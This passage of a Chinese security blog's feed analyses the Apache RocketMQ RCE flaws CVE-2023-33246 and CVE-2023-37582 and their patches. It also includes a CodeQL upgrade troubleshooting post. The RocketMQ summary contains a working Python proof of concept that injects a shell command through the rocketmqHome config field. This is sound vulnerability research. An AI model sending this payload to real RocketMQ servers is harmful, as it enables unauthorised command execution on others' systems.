href="#3-2-patch2" class="headerlink" title="3.2 patch2"></a>3.2 patch2</h3><p><a href="https://github.com/apache/rocketmq/pull/6749/files">https://github.com/apache/rocketmq/pull/6749/files</a></p><p>最主要的，把FilterServerManager给删了，彻底没命令执行的Sink了<br><img src="/images/pasted-847.png" alt="upload successful"></p><h3 id="3-3-patch3"><a href="#3-3-patch3" class="headerlink" title="3.3 patch3"></a>3.3 patch3</h3><p>在最新的代码中，不止在Processor 上引入了黑名单，在Config 上也引入了configblacklist</p><p><a href="https://github.com/search?q=repo:apache/rocketmq%20configblacklist&type=code">https://github.com/search?q=repo%3Aapache%2Frocketmq%20configblacklist&amp;type=code</a></p><p><img src="/images/pasted-855.png" alt="upload successful"></p><p>这中间应该还发生了一些故事</p><h2 id="0x04-拓展思考"><a href="#0x04-拓展思考" class="headerlink" title="0x04 拓展思考"></a>0x04 拓展思考</h2><p>还有哪些Config 可以被控制</p><p>AdminBrokerProcessor.java<br><img src="/images/pasted-850.png" alt="upload successful"><br>ControllerRequestProcessor.java<br><img src="/images/pasted-852.png" alt="upload successful"><br>DefaultRequestProcessor.java<br><img src="/images/pasted-853.png" alt="upload successful"><br>container.BrokerContainerProcessor.java<br><img src="/images/pasted-851.png" alt="upload successful"></p><p>可以看到，比patch1 中的过滤多了BrokerContainerProcessor</p><p>但是后续BrokerContainerProcessor 也增加了过滤<a href="https://github.com/apache/rocketmq/pull/7587/files">https://github.com/apache/rocketmq/pull/7587/files</a></p><p><img src="/images/pasted-854.png" alt="upload successful"></p><h3 id="4-1-Try-Escape-CVE-2023-37582"><a href="#4-1-Try-Escape-CVE-2023-37582" class="headerlink" title="4.1 Try Escape CVE-2023-37582"></a>4.1 Try Escape CVE-2023-37582</h3><p>CVE-2023-33246 最终的sink 点整个被删了，没有操作空间<br>CVE-2023-37582 增加了以上的Patchs</p><p>核心逻辑有两个</p><ol><li>Processor 从Command 中获取属性，并更新Config<ul><li>UpdateConfig 只是其中的一种Command</li></ul></li><li>Configure.update() 调用persist 进行文件写入，文件名和文件内容都在Config 中</li></ol><h4 id="1-BrokerContainerProcessor"><a href="#1-BrokerContainerProcessor" class="headerlink" title="1. BrokerContainerProcessor"></a>1. BrokerContainerProcessor</h4><p>以BrokerContainerProcessor 为例</p><p><img src="/images/pasted-857.png" alt="upload successful"></p><p>但是实际上，根源在update 中的properties2Object，而不只是update</p><p><img src="/images/pasted-858.png" alt="upload successful"></p><h4 id="2-Bypass-及影响"><a href="#2-Bypass-及影响" class="headerlink" title="2. Bypass 及影响"></a>2. Bypass 及影响</h4><p>Bypass 逻辑：<br>1.addBorker，此时没有受各种黑名单限制<br>2.updateBrokerConfig：此时只限制了从net 而来的属性，原来的属性不受影响</p><p><img src="/images/pasted-859.png" alt="upload successful"></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ul><li>[1] <a href="https://github.com/vulhub/vulhub/blob/master/rocketmq/CVE-2023-33246/README.zh-cn.md">Apache RocketMQ 远程命令执行漏洞（CVE-2023-33246）</a></li><li>[2] <a href="https://paper.seebug.org/2081/">Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246）漏洞分析</a></li><li>[3] <a href="https://xz.aliyun.com/t/12589">Apache RocketMQ 远程代码执行漏洞 CVE-2023-33246 分析</a></li><li>[4] <a href="https://xz.aliyun.com/t/12691">Apache RocketMQ NameServer 远程代码执行漏洞（CVE-2023-37582）分析</a></li><li>[5] <a href="http://www.lvyyevd.cn/archives/rocketmqrcecve-2023-33246-fen-xi">RocketMQ RCE（CVE-2023-33246）分析</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x01-CVE-2023-33246&quot;&gt;&lt;a href=&quot;#0x01-CVE-2023-33246&quot; class=&quot;headerlink&quot; title=&quot;0x01 CVE-2023-33246&quot;&gt;&lt;/a&gt;0x01 CVE-2023-33246&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;漏洞描述&lt;br&gt;RocketMQ 5.1.0及以下版本，在一定条件下，存在远程命令执行风险。RocketMQ的NameServer、Broker、Controller等多个组件外网泄露，缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行命令。 此外，攻击者可以通过伪造 RocketMQ 协议内容来达到同样的效果。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;影响版本&lt;br&gt;5.0.0 &amp;lt;= Apache RocketMQ &amp;lt; 5.1.1&lt;br&gt;4.0.0 &amp;lt;= Apache RocketMQ &amp;lt; 4.9.6&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-1-环境搭建&quot;&gt;&lt;a href=&quot;#1-1-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;1.1 环境搭建&quot;&gt;&lt;/a&gt;1.1 环境搭建&lt;/h2&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;vim bin/runserver.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 增加DEBUG JAVA OPT&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;JAVA_OPT=&lt;span class=&quot;string&quot;&gt;&amp;quot;$&amp;#123;JAVA_OPT&amp;#125; -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;vim bin/runbroker.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 增加DEBUG JAVA OPT&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;JAVA_OPT=&lt;span class=&quot;string&quot;&gt;&amp;quot;$&amp;#123;JAVA_OPT&amp;#125; -Xdebug -Xrunjdwp:transport=dt_socket,address=5006,server=y,suspend=n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./mqbroker -n &lt;span class=&quot;number&quot;&gt;127.0&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0.1&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;9876&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./mqnamesrv&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;1-2-POC复现&quot;&gt;&lt;a href=&quot;#1-2-POC复现&quot; class=&quot;headerlink&quot; title=&quot;1.2 POC复现&quot;&gt;&lt;/a&gt;1.2 POC复现&lt;/h3&gt;&lt;h3 id=&quot;1-2-1-POC&quot;&gt;&lt;a href=&quot;#1-2-1-POC&quot; class=&quot;headerlink&quot; title=&quot;1.2.1 POC&quot;&gt;&lt;/a&gt;1.2.1 POC&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; socket&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; binascii&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;client = socket.socket()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;client.connect((&lt;span class=&quot;string&quot;&gt;&amp;#x27;127.0.0.1&amp;#x27;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;10911&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;json = &lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#123;&amp;quot;code&amp;quot;:25,&amp;quot;extFields&amp;quot;:&amp;#123;&amp;quot;test&amp;quot;:&amp;quot;RockedtMQ&amp;quot;&amp;#125;,&amp;quot;flag&amp;quot;:0,&amp;quot;language&amp;quot;:&amp;quot;JAVA&amp;quot;,&amp;quot;opaque&amp;quot;:266,&amp;quot;serializeTypeCurrentRPC&amp;quot;:&amp;quot;JSON&amp;quot;,&amp;quot;version&amp;quot;:433&amp;#125;&amp;#x27;&lt;/span&gt;.encode(&lt;span class=&quot;string&quot;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cmd = &lt;span class=&quot;string&quot;&gt;&amp;quot;-c $@| sh . echo echo &amp;#x27;touch /tmp/success_rocketmq&amp;#x27; | bash -i&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;body=&lt;span class=&quot;string&quot;&gt;f&amp;#x27;filterServerNums=1&#92;nnamesrvAddr=127.0.0.1:9876&#92;nrocketmqHome=&lt;span class=&quot;subst&quot;&gt;&amp;#123;cmd&amp;#125;&lt;/span&gt;&amp;#x27;&lt;/span&gt;.encode(&lt;span class=&quot;string&quot;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;json_lens = int(len(binascii.hexlify(json).decode(&lt;span class=&quot;string&quot;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;))/&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;head1 = &lt;span class=&quot;string&quot;&gt;&amp;#x27;00000000&amp;#x27;&lt;/span&gt;+str(hex(json_lens))[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;all_lens = int(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;+len(binascii.hexlify(body).decode(&lt;span class=&quot;string&quot;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;))/&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;+json_lens)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;head2 = &lt;span class=&quot;string&quot;&gt;&amp;#x27;00000000&amp;#x27;&lt;/span&gt;+str(hex(all_lens))[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;data = head2[&lt;span class=&quot;number&quot;&gt;-8&lt;/span&gt;:]+head1[&lt;span class=&quot;number&quot;&gt;-8&lt;/span&gt;:]+binascii.hexlify(json).decode(&lt;span class=&quot;string&quot;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)+binascii.hexlify(body).decode(&lt;span class=&quot;string&quot;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# send&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;client.send(bytes.fromhex(data))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;data_recv = client.recv(&lt;span class=&quot;number&quot;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(data_recv)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&quot;1-2-2-疑问POC&quot;&gt;&lt;a href=&quot;#1-2-2-疑问POC&quot; class=&quot;headerlink&quot; title=&quot;1.2.2 疑问POC&quot;&gt;&lt;/a&gt;1.2.2 疑问POC&lt;/h4&gt;&lt;p&gt;参考【1】中的POC，执行总是会报错connect to 127.0.0.1:10911 failed，Google反馈的大都是配置broker，但是实际测试仍然报错。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;TODO: 分析原因&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="CVE-2023-33246" scheme="http://m0d9.me/tags/CVE-2023-33246/"/>
    
    <category term="RocketMQ" scheme="http://m0d9.me/tags/RocketMQ/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 升级V2.14踩坑</title>
    <link href="http://m0d9.me/2023/08/09/CodeQL%E5%8D%87%E7%BA%A7%E4%B9%8B%E5%9D%91/"/>
    <id>http://m0d9.me/2023/08/09/CodeQL%E5%8D%87%E7%BA%A7%E4%B9%8B%E5%9D%91/</id>
    <published>2023-08-09T03:29:00.000Z</published>
    <updated>2023-08-25T08:20:13.333Z</updated>
    
    <content type="html"><![CDATA[<ul><li>升级前 v2.13.1</li><li>升级后 v2.14.1 </li></ul><p>升级前kafka jass ql 运行得好好的，升级后跑不出来。。。<br>好在以前遇到过这种问题，大概率又是CodeQL 升级的锅</p><h2 id="0x01-猜测1-databae问题"><a href="#0x01-猜测1-databae问题" class="headerlink" title="0x01 猜测1: databae问题"></a>0x01 猜测1: databae问题</h2><p>database是v2.10.4版本codeql create的</p><p>用v2.13.1 版本codeql create，发现再codeql v2.14.1 ql run仍然不行，无结果，尝试用v2.14.1构建db</p><p>用v2.14.1构建，发现仍然失败</p><a id="more"></a><h2 id="0x02-猜测2：语法变动"><a href="#0x02-猜测2：语法变动" class="headerlink" title="0x02 猜测2：语法变动"></a>0x02 猜测2：语法变动</h2><p>之前就有过partial flow 语法变动的经历，排查下</p><p>这里排查过程也踩了个坑，找了个DataFlow 的test ql抄抄发现不行</p><h3 id="2-1-DataFlow-VS-TaintTracking"><a href="#2-1-DataFlow-VS-TaintTracking" class="headerlink" title="2.1 DataFlow VS TaintTracking"></a>2.1 DataFlow VS TaintTracking</h3><p>DataFlow 和TaintTracking 区别还是较大的</p><blockquote><p>Normal data flow vs taint tracking<br>In the standard libraries, we make a distinction between ‘normal’ data flow and taint tracking. The normal data flow libraries are used to analyze the information flow in which data values are preserved at each step.</p></blockquote><blockquote><p>For example, if you are tracking an insecure object x (which might be some untrusted or potentially malicious data), a step in the program may ‘change’ its value. So, in a simple process such as y = x + 1, a normal data flow analysis will highlight the use of x, but not y. However, since y is derived from x, it is influenced by the untrusted or ‘tainted’ information, and therefore it is also tainted. Analyzing the flow of the taint from x to y is known as taint tracking.</p></blockquote><blockquote><p>In QL, taint tracking extends data flow analysis by including steps in which the data values are not necessarily preserved, but the potentially insecure object is still propagated. These flow steps are modeled in the taint-tracking library using predicates that hold if taint is propagated between nodes.</p></blockquote><h3 id="2-2-Final-ql"><a href="#2-2-Final-ql" class="headerlink" title="2.2 Final ql"></a>2.2 Final ql</h3><p>最终的QL如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line"># 注意这里TaintFlow 为下面声明的module TaintFlow</span><br><span class="line">import TaintFlow::PathGraph</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private class JavaxWSRSSource extends RemoteFlowSource &#123;</span><br><span class="line">  JavaxWSRSSource()&#123;</span><br><span class="line">      exists( </span><br><span class="line">          Method m, Annotation a | </span><br><span class="line">          m.getAParameter() &#x3D; this.asParameter()</span><br><span class="line">          and m.getAnAnnotation() &#x3D; a</span><br><span class="line">          and a.getType().hasQualifiedName(&quot;javax.ws.rs&quot;, &quot;Path&quot;)</span><br><span class="line">      )</span><br><span class="line">  &#125;</span><br><span class="line">  override string getSourceType() &#123; result &#x3D; &quot;javax.ws.rs&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module TaintFlowConfig implements DataFlow::ConfigSig &#123;</span><br><span class="line">  int fieldFlowBranchLimit() &#123; result &#x3D; 100000 &#125;</span><br><span class="line"></span><br><span class="line">  predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">    &#x2F;&#x2F; src instanceof RemoteFlowSource </span><br><span class="line">    src instanceof JavaxWSRSSource </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    &#x2F;&#x2F; sink.asExpr().getLocation().getFile().getRelativePath().matches(&quot;%ChannelBuilders.java&quot;)</span><br><span class="line">    &#x2F;&#x2F; sink.asExpr().getLocation().getFile().getRelativePath().matches(&quot;%JaasContext.java&quot;)</span><br><span class="line">    &#x2F;&#x2F; sink.asExpr().getLocation().getFile().getRelativePath().matches(&quot;%JaasConfig.java&quot;)</span><br><span class="line">    &#x2F;&#x2F; sink.asExpr().getLocation().getFile().getRelativePath().matches(&quot;%AbstractLogin.java&quot;)</span><br><span class="line">    &#x2F;&#x2F; sink.asExpr().getLocation().getFile().getRelativePath().matches(&quot;%KerberosLogin.java&quot;)</span><br><span class="line">    &#x2F;&#x2F; and sink.asExpr().getEnclosingCallable().hasName(&quot;configure&quot;)</span><br><span class="line">    &#x2F;&#x2F; sink.asExpr().getLocation().getFile().getRelativePath().matches(&quot;%Login.java&quot;)</span><br><span class="line">    &#x2F;&#x2F; and sink.asExpr().getEnclosingCallable().hasName(&quot;login&quot;)</span><br><span class="line">    &#x2F;&#x2F; at last</span><br><span class="line">    &#x2F;&#x2F; 结论，不行</span><br><span class="line">    exists( </span><br><span class="line">        ConstructorCall cc|</span><br><span class="line">        cc.getConstructor().getDeclaringType().getASupertype*().hasQualifiedName(&quot;javax.security.auth.login&quot;, &quot;LoginContext&quot;)</span><br><span class="line">        and sink.asExpr() &#x3D; cc.getArgument(3)</span><br><span class="line">        &#x2F;&#x2F; and this.asExpr() &#x3D; cc</span><br><span class="line">        and cc.getNumArgument() &#x3D; 4</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate isAdditionalFlowStep (DataFlow::Node fromNode, DataFlow::Node toNode) &#123;</span><br><span class="line">    exists(ConstructorCall cc |</span><br><span class="line">        cc.getAnArgument() &#x3D; fromNode.asExpr()</span><br><span class="line">        and cc &#x3D; toNode.asExpr()</span><br><span class="line">        and cc.getConstructor().getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;StreamTokenizer&quot;)</span><br><span class="line">    )</span><br><span class="line">    or </span><br><span class="line">    exists(VarAccess va, ClassOrInterface ci |</span><br><span class="line">        va.getQualifier().getType().getFile() &#x3D; ci.getFile()</span><br><span class="line">        and ci.getAField().hasName(&quot;sval&quot;)</span><br><span class="line">        and ci.hasName(&quot;StreamTokenizer&quot;)</span><br><span class="line">        and va.getVariable().hasName(&quot;sval&quot;)</span><br><span class="line">        and va &#x3D; toNode.asExpr()</span><br><span class="line">        and va.getQualifier() &#x3D; fromNode.asExpr()</span><br><span class="line">    )</span><br><span class="line">    or </span><br><span class="line">    exists(ConstructorCall cc |</span><br><span class="line">        cc.getAnArgument() &#x3D; fromNode.asExpr()</span><br><span class="line">        and cc &#x3D; toNode.asExpr()</span><br><span class="line">        and cc.getConstructor().getDeclaringType().hasQualifiedName(&quot;javax.security.auth.login&quot;, &quot;AppConfigurationEntry&quot;)</span><br><span class="line">    )</span><br><span class="line">    or</span><br><span class="line">    exists(MethodAccess ma |  </span><br><span class="line">        ma.getQualifier() &#x3D; fromNode.asExpr()</span><br><span class="line">        and ma &#x3D; toNode.asExpr()</span><br><span class="line">        and ma.getMethod().hasName(&quot;getOptions&quot;)</span><br><span class="line">        and ma.getQualifier().getType().hasName(&quot;AppConfigurationEntry&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate allowImplicitRead(DataFlow::Node node, DataFlow::ContentSet c) &#123;</span><br><span class="line">    isSink(node)</span><br><span class="line">    and (</span><br><span class="line">        c instanceof DataFlow::FieldContent</span><br><span class="line">        and c.(DataFlow::FieldContent).getField().getDeclaringType().getASourceSupertype().hasName(&quot;Configuration&quot;)</span><br><span class="line">        or </span><br><span class="line">        c instanceof DataFlow::CollectionContent</span><br><span class="line">    )</span><br><span class="line">  &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module TaintFlow &#x3D; TaintTracking::Global&lt;TaintFlowConfig&gt;;</span><br><span class="line"></span><br><span class="line">from TaintFlow::PathNode source, TaintFlow::PathNode sink</span><br><span class="line">where TaintFlow::flowPath(source, sink)</span><br><span class="line">select sink, source, sink, &quot;$@&quot;, source, source.toString()</span><br></pre></td></tr></table></figure><p>和partial flow 结构类似，看来是之后要用这个语法了</p><h3 id="2-3-Tips"><a href="#2-3-Tips" class="headerlink" title="2.3 Tips"></a>2.3 Tips</h3><h4 id="path-problem"><a href="#path-problem" class="headerlink" title="path-problem"></a>path-problem</h4><p>需要遵循以下格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. @kind 表示是路径问题</span><br><span class="line">&#x2F;**</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> *&#x2F;</span><br><span class="line">2. 引入PathGraph，老版本是在DataFlow下，新版本为自定义的module</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">3. 保持以下格式，4个字断</span><br><span class="line">select source, source, sink, &quot;$@&quot;, sink, sink.toString()</span><br><span class="line">- 1. source，会显示为vs code message 左边</span><br><span class="line">- 2. source，source点</span><br><span class="line">- 3. sink，sink点</span><br><span class="line">- 4. &quot;$@&quot;, sink, sink.toString()，这个实际为一个，具体可以看codeql 基础知识，显示为vs code message 右边</span><br></pre></td></tr></table></figure><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><ol><li>数据库基本兼容，v2.14.1的ql，用v2.10.4的db，也OK</li><li>DataFlow 和TaintTracking 区别比较大，可以参考[1]</li><li>升级codeql 一定要慎重，没有那么兼容</li></ol><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul><li>[1] <a href="https://codeql.github.com/docs/writing-codeql-queries/about-data-flow-analysis/">About data flow analysis</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;升级前 v2.13.1&lt;/li&gt;
&lt;li&gt;升级后 v2.14.1 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;升级前kafka jass ql 运行得好好的，升级后跑不出来。。。&lt;br&gt;好在以前遇到过这种问题，大概率又是CodeQL 升级的锅&lt;/p&gt;
&lt;h2 id=&quot;0x01-猜测1-databae问题&quot;&gt;&lt;a href=&quot;#0x01-猜测1-databae问题&quot; class=&quot;headerlink&quot; title=&quot;0x01 猜测1: databae问题&quot;&gt;&lt;/a&gt;0x01 猜测1: databae问题&lt;/h2&gt;&lt;p&gt;database是v2.10.4版本codeql create的&lt;/p&gt;
&lt;p&gt;用v2.13.1 版本codeql create，发现再codeql v2.14.1 ql run仍然不行，无结果，尝试用v2.14.1构建db&lt;/p&gt;
&lt;p&gt;用v2.14.1构建，发现仍然失败&lt;/p&gt;</summary>
    
    
    
    <category term="CodeQL" scheme="http://m0d9.me/categories/CodeQL/"/>
    
    
    <category term="CodeQL" scheme="http://m0d9.me/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>《Apache Dubbo: All roads lead to RCE》CodeQL 笔记</title>
    <link href="http://m0d9.me/2023/05/11/Apache-Dubbo-All-roads-lead-to-RCE-%E7%AC%94%E8%AE%B0/"/>
    <id>http://m0d9.me/2023/05/11/Apache-Dubbo-All-roads-lead-to-RCE-%E7%AC%94%E8%AE%B0/</id>
    <published>2023-05-11T09:24:00.000Z</published>
    <updated>2023-09-06T09:49:13.826Z</updated>
    
